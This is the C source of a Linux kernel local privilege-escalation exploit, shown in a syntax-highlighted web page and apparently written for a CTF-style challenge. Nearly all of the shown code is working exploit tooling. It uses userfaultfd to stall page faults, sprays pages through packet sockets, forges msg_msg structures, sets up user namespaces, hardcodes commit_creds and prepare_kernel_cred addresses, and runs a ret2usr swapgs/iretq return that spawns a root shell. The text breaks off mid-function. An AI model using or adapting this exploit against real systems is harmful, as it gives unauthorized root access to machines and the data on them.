class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;./klog.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;keyutils.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/if_packet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;net/if.h&gt;</span> <span class="comment">// 添加 if_nametoindex 函数的头文件</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/resource.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;threads.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TTY_MAGIC 0x200005401</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KERNCALL __attribute__((regparm(3)))</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">dump_hex</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *<span class="keyword">restrict</span> hex, <span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">  <span class="type">size_t</span> i, cnt;</span><br><span class="line">  <span class="type">size_t</span> res = len % <span class="number">0x10</span>;</span><br><span class="line">  <span class="type">size_t</span> times = len / <span class="number">0x10</span> + (res ? <span class="number">0x1</span> : <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> __len = (len &amp; (~<span class="number">0xf</span>)) + (res ? <span class="number">0x10</span> : <span class="number">0</span>);</span><br><span class="line">  <span class="type">char</span> *str = (<span class="type">char</span> *)<span class="built_in">malloc</span>(__len);</span><br><span class="line">  <span class="type">char</span> *__hex = (<span class="type">char</span> *)<span class="built_in">malloc</span>(__len);</span><br><span class="line">  <span class="built_in">memset</span>(str, <span class="number">0</span>, __len);</span><br><span class="line">  <span class="built_in">memcpy</span>(str, hex, len);</span><br><span class="line">  <span class="built_in">memcpy</span>(__hex, str, __len);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">size_t</span> l = <span class="number">0</span>; l &lt; __len; ++l) &#123;</span><br><span class="line">    <span class="keyword">if</span> (l &gt;= len || hex[l] &lt; <span class="string">&#x27; &#x27;</span> || hex[l] &gt;= <span class="number">0x7f</span>) &#123;</span><br><span class="line">      str[l] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">char</span> str1[<span class="number">0x9</span>], str2[<span class="number">0x9</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>, cnt = <span class="number">0</span>; i &lt; times; ++i) &#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(str1, str + cnt * <span class="number">0x8</span>, <span class="number">0x8</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(str2, str + (cnt + <span class="number">1</span>) * <span class="number">0x8</span>, <span class="number">0x8</span>);</span><br><span class="line">    info(<span class="string">&quot;0x%04lx:  0x%016lx  0x%016lx    %s %s\n&quot;</span>, i * <span class="number">0x10</span>,</span><br><span class="line">         ((<span class="type">uint64_t</span> *)__hex)[cnt], ((<span class="type">uint64_t</span> *)__hex)[cnt + <span class="number">1</span>], str1, str2);</span><br><span class="line">    cnt += <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>(str);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *(*prepare_kernel_cred)(<span class="type">void</span> *)KERNCALL = (<span class="type">void</span> *)<span class="number">0xffffffff81116130</span>;</span><br><span class="line"><span class="type">void</span> (*commit_creds)(<span class="type">void</span> *) KERNCALL = (<span class="type">void</span> *)<span class="number">0xffffffff81115e60</span>;</span><br><span class="line"><span class="type">void</span> *init_cred;</span><br><span class="line"></span><br><span class="line"><span class="comment">// cat /proc/kallsyms | grep &quot;prepare_kernel_cred&quot;</span></span><br><span class="line"><span class="comment">// sudo cat /proc/buddyinfo</span></span><br><span class="line"><span class="comment">// sudo cat /proc/pagetypeinfo</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @fd openthe device;</span></span><br><span class="line"><span class="comment"> * @fd_tty openthe ptmx;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> fd, fd_tty;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">uint64_t</span> kernel_base, canary;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> page_size;</span><br><span class="line"><span class="type">size_t</span> *physmap_spray_arr[<span class="number">16000</span>];</span><br><span class="line"><span class="comment">// uint64_t heap_address = 0;</span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> <span class="title function_">calc</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> addr)</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> addr - <span class="number">0xffffffff81000000</span> + kernel_base;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">pthread_t</span> monitor_thread;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">register_userfaultfd</span><span class="params">(<span class="type">void</span> *addr, <span class="type">unsigned</span> <span class="type">long</span> len,</span></span><br><span class="line"><span class="params">                          <span class="type">void</span> *(*handler)(<span class="type">void</span> *))</span> &#123;</span><br><span class="line">  <span class="type">long</span> uffd;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">uffdio_api</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">uffdio_register</span>;</span></span><br><span class="line">  <span class="type">int</span> s;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Create and enable userfaultfd object */</span></span><br><span class="line">  uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">  <span class="keyword">if</span> (uffd == <span class="number">-1</span>)</span><br><span class="line">    err_exit(<span class="string">&quot;userfaultfd&quot;</span>);</span><br><span class="line"></span><br><span class="line">  uffdio_api.api = UFFD_API;</span><br><span class="line">  uffdio_api.features = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="number">-1</span>)</span><br><span class="line">    err_exit(<span class="string">&quot;ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">  uffdio_register.range.start = (<span class="type">unsigned</span> <span class="type">long</span>)addr;</span><br><span class="line">  uffdio_register.range.len = len;</span><br><span class="line">  uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">  <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="number">-1</span>)</span><br><span class="line">    err_exit(<span class="string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line"></span><br><span class="line">  s = pthread_create(&amp;monitor_thread, <span class="literal">NULL</span>, handler, (<span class="type">void</span> *)uffd);</span><br><span class="line">  <span class="keyword">if</span> (s != <span class="number">0</span>)</span><br><span class="line">    err_exit(<span class="string">&quot;pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span> &#123; commit_creds(init_cred); &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">shell</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!getuid()) &#123;</span><br><span class="line">    success(<span class="string">&quot;[=============================================]\n&quot;</span>);</span><br><span class="line">    success(<span class="string">&quot;[===================&quot;</span> GREEN <span class="string">&quot;SUCCESS&quot;</span> END</span><br><span class="line">            <span class="string">&quot;===================]\n&quot;</span>);</span><br><span class="line">    success(<span class="string">&quot;[=============================================]\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    err_exit(<span class="string">&quot;*** root failed ***&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// data for copy</span></span><br><span class="line"><span class="type">uint64_t</span> page[<span class="number">0x1000</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">fault_handler_thread</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line">  <span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">  <span class="type">static</span> <span class="type">int</span> fault_cnt = <span class="number">0</span>;</span><br><span class="line">  <span class="type">long</span> uffd;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">  <span class="type">ssize_t</span> nread;</span><br><span class="line"></span><br><span class="line">  uffd = (<span class="type">long</span>)arg;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">    <span class="type">int</span> nready;</span><br><span class="line">    pollfd.fd = uffd;</span><br><span class="line">    pollfd.events = POLLIN;</span><br><span class="line">    nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 当 poll 返回时说明出现了缺页异常</span></span><br><span class="line"><span class="comment">     * 你可以在这里插入一些比如说 sleep() 一类的操作</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    success(<span class="string">&quot;enter the fault handler\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    fd_tty = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR | O_NOCTTY);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nready == <span class="number">-1</span>)</span><br><span class="line">      err_exit(<span class="string">&quot;poll&quot;</span>);</span><br><span class="line"></span><br><span class="line">    nread = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nread == <span class="number">0</span>)</span><br><span class="line">      err_exit(<span class="string">&quot;EOF on userfaultfd!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nread == <span class="number">-1</span>)</span><br><span class="line">      err_exit(<span class="string">&quot;read&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)</span><br><span class="line">      err_exit(<span class="string">&quot;Unexpected event on userfaultfd\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uffdio_copy.src = (<span class="type">unsigned</span> <span class="type">long</span>)page;</span><br><span class="line">    uffdio_copy.dst =</span><br><span class="line">        (<span class="type">unsigned</span> <span class="type">long</span>)msg.arg.pagefault.address &amp; ~(page_size - <span class="number">1</span>);</span><br><span class="line">    uffdio_copy.len = page_size;</span><br><span class="line">    uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">    uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>)</span><br><span class="line">      err_exit(<span class="string">&quot;ioctl-UFFDIO_COPY&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> ETH_P_ALL</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ETH_P_ALL 0x0003</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">packet_socket_rx_ring_init</span><span class="params">(<span class="type">int</span> s, <span class="type">unsigned</span> <span class="type">int</span> block_size,</span></span><br><span class="line"><span class="params">                                <span class="type">unsigned</span> <span class="type">int</span> frame_size, <span class="type">unsigned</span> <span class="type">int</span> block_nr,</span></span><br><span class="line"><span class="params">                                <span class="type">unsigned</span> <span class="type">int</span> sizeof_priv,</span></span><br><span class="line"><span class="params">                                <span class="type">unsigned</span> <span class="type">int</span> timeout)</span> &#123;</span><br><span class="line">  <span class="type">int</span> v = TPACKET_V3;</span><br><span class="line">  <span class="type">int</span> rv = setsockopt(s, SOL_PACKET, PACKET_VERSION, &amp;v, <span class="keyword">sizeof</span>(v));</span><br><span class="line">  <span class="keyword">if</span> (rv &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;setsockopt(PACKET_VERSION)&quot;</span>), <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req3</span> <span class="title">req</span>;</span></span><br><span class="line">  <span class="built_in">memset</span>(&amp;req, <span class="number">0</span>, <span class="keyword">sizeof</span>(req));</span><br><span class="line">  req.tp_block_size = block_size;</span><br><span class="line">  req.tp_frame_size = frame_size;</span><br><span class="line">  req.tp_block_nr = block_nr;</span><br><span class="line">  req.tp_frame_nr = (block_size * block_nr) / frame_size;</span><br><span class="line">  req.tp_retire_blk_tov = timeout;</span><br><span class="line">  req.tp_sizeof_priv = sizeof_priv;</span><br><span class="line">  req.tp_feature_req_word = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  rv = setsockopt(s, SOL_PACKET, PACKET_RX_RING, &amp;req, <span class="keyword">sizeof</span>(req));</span><br><span class="line">  <span class="keyword">if</span> (rv &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;setsockopt(PACKET_RX_RING)&quot;</span>), <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">packet_socket_setup</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> block_size, <span class="type">unsigned</span> <span class="type">int</span> frame_size,</span></span><br><span class="line"><span class="params">                        <span class="type">unsigned</span> <span class="type">int</span> block_nr, <span class="type">unsigned</span> <span class="type">int</span> sizeof_priv,</span></span><br><span class="line"><span class="params">                        <span class="type">int</span> timeout)</span> &#123;</span><br><span class="line">  <span class="type">int</span> s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));</span><br><span class="line">  <span class="keyword">if</span> (s &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;socket(AF_PACKET)&quot;</span>), <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">  packet_socket_rx_ring_init(s, block_size, frame_size, block_nr, sizeof_priv,</span><br><span class="line">                             timeout);</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_ll</span> <span class="title">sa</span>;</span></span><br><span class="line">  <span class="built_in">memset</span>(&amp;sa, <span class="number">0</span>, <span class="keyword">sizeof</span>(sa));</span><br><span class="line">  sa.sll_family = PF_PACKET;</span><br><span class="line">  sa.sll_protocol = htons(ETH_P_ALL);</span><br><span class="line">  sa.sll_ifindex = if_nametoindex(<span class="string">&quot;lo&quot;</span>);</span><br><span class="line">  sa.sll_hatype = <span class="number">0</span>;</span><br><span class="line">  sa.sll_pkttype = <span class="number">0</span>;</span><br><span class="line">  sa.sll_halen = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> rv = bind(s, (<span class="keyword">struct</span> sockaddr *)&amp;sa, <span class="keyword">sizeof</span>(sa));</span><br><span class="line">  <span class="keyword">if</span> (rv &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;bind(AF_PACKET)&quot;</span>), <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">pagealloc_pad</span><span class="params">(<span class="type">int</span> count, <span class="type">int</span> size)</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> packet_socket_setup(size, <span class="number">2048</span>, count, <span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hexdump</span><span class="params">(<span class="type">uint64_t</span> *payload, <span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; ++i) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d:\t%#lx\n&quot;</span>, i, payload[i]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> &#123;</span></span><br><span class="line">  <span class="type">uint64_t</span> next;</span><br><span class="line">  <span class="type">uint64_t</span> prev;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">  <span class="type">uint64_t</span> m_type;</span><br><span class="line">  <span class="type">uint64_t</span> m_ts;</span><br><span class="line">  <span class="type">uint64_t</span> next;</span><br><span class="line">  <span class="type">uint64_t</span> security;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> &#123;</span></span><br><span class="line">  <span class="type">uint64_t</span> next;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">struct msgbuf &#123;</span></span><br><span class="line"><span class="comment">    long mtype;</span></span><br><span class="line"><span class="comment">    char mtext[0];</span></span><br><span class="line"><span class="comment">&#125;;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">get_msg_queue</span><span class="params">(<span class="type">void</span>)</span> &#123; <span class="keyword">return</span> msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT); &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">read_msg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz, msgtyp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * the msgp should be a pointer to the `struct msgbuf`,</span></span><br><span class="line"><span class="comment"> * and the data should be stored in msgbuf.mtext</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">write_msg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span> &#123;</span><br><span class="line">  ((<span class="keyword">struct</span> msgbuf *)msgp)-&gt;mtype = msgtyp;</span><br><span class="line">  <span class="keyword">return</span> msgsnd(msqid, msgp, msgsz, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* for MSG_COPY, `msgtyp` means to read no.msgtyp msg_msg on the queue */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">peek_msg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz, msgtyp,</span><br><span class="line">                MSG_COPY | IPC_NOWAIT | MSG_NOERROR);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">build_msg</span><span class="params">(<span class="keyword">struct</span> msg_msg *msg, <span class="type">uint64_t</span> m_list_next, <span class="type">uint64_t</span> m_list_prev,</span></span><br><span class="line"><span class="params">               <span class="type">uint64_t</span> m_type, <span class="type">uint64_t</span> m_ts, <span class="type">uint64_t</span> next,</span></span><br><span class="line"><span class="params">               <span class="type">uint64_t</span> security)</span> &#123;</span><br><span class="line">  msg-&gt;m_list.next = m_list_next;</span><br><span class="line">  msg-&gt;m_list.prev = m_list_prev;</span><br><span class="line">  msg-&gt;m_type = m_type;</span><br><span class="line">  msg-&gt;m_ts = m_ts;</span><br><span class="line">  msg-&gt;next = next;</span><br><span class="line">  msg-&gt;security = security;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_stat</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;movq %%cs, %0;&quot;</span></span></span><br><span class="line"><span class="params">               <span class="string">&quot;movq %%ss, %1;&quot;</span></span></span><br><span class="line"><span class="params">               <span class="string">&quot;movq %%rsp, %2;&quot;</span></span></span><br><span class="line"><span class="params">               <span class="string">&quot;pushfq;&quot;</span></span></span><br><span class="line"><span class="params">               <span class="string">&quot;popq %3;&quot;</span></span></span><br><span class="line"><span class="params">               : <span class="string">&quot;=r&quot;</span>(user_cs), <span class="string">&quot;=r&quot;</span>(user_ss), <span class="string">&quot;=r&quot;</span>(user_sp), <span class="string">&quot;=r&quot;</span>(user_rflags)</span></span><br><span class="line"><span class="params">               :</span></span><br><span class="line"><span class="params">               : <span class="string">&quot;memory&quot;</span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">templine</span><span class="params">()</span> &#123;</span><br><span class="line">  commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">  <span class="keyword">asm</span>(<span class="string">&quot;pushq   %0;&quot;</span></span><br><span class="line">      <span class="string">&quot;pushq   %1;&quot;</span></span><br><span class="line">      <span class="string">&quot;pushq   %2;&quot;</span></span><br><span class="line">      <span class="string">&quot;pushq   %3;&quot;</span></span><br><span class="line">      <span class="string">&quot;pushq   $shell;&quot;</span></span><br><span class="line">      <span class="string">&quot;pushq   $0;&quot;</span></span><br><span class="line">      <span class="string">&quot;swapgs;&quot;</span></span><br><span class="line">      <span class="string">&quot;popq    %%rbp;&quot;</span></span><br><span class="line">      <span class="string">&quot;iretq;&quot;</span> ::<span class="string">&quot;m&quot;</span>(user_ss),</span><br><span class="line">      <span class="string">&quot;m&quot;</span>(user_sp), <span class="string">&quot;m&quot;</span>(user_rflags), <span class="string">&quot;m&quot;</span>(user_cs));</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_cpu</span><span class="params">(<span class="type">int</span> core)</span> &#123;</span><br><span class="line">  <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">  CPU_ZERO(&amp;cpu_set);</span><br><span class="line">  CPU_SET(core, &amp;cpu_set);</span><br><span class="line">  sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">unshare_setup</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  <span class="type">char</span> edit[<span class="number">0x100</span>];</span><br><span class="line">  <span class="type">int</span> tmp_fd;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET))</span><br><span class="line">    err_exit(<span class="string">&quot;FAILED to create a new namespace&quot;</span>);</span><br><span class="line"></span><br><span class="line">  tmp_fd = open(<span class="string">&quot;/proc/self/setgroups&quot;</span>, O_WRONLY);</span><br><span class="line">  write(tmp_fd, <span class="string">&quot;deny&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;deny&quot;</span>));</span><br><span class="line">  close(tmp_fd);</span><br><span class="line"></span><br><span class="line">  tmp_fd = open(<span class="string">&quot;/proc/self/uid_map&quot;</span>, O_WRONLY);</span><br><span class="line">  <span class="built_in">snprintf</span>(edit, <span class="keyword">sizeof</span>(edit), <span class="string">&quot;0 %d 1&quot;</span>, getuid());</span><br><span class="line">  write(tmp_fd, edit, <span class="built_in">strlen</span>(edit));</span><br><span class="line">  close(tmp_fd);</span><br><span class="line"></span><br><span class="line">  tmp_fd = open(<span 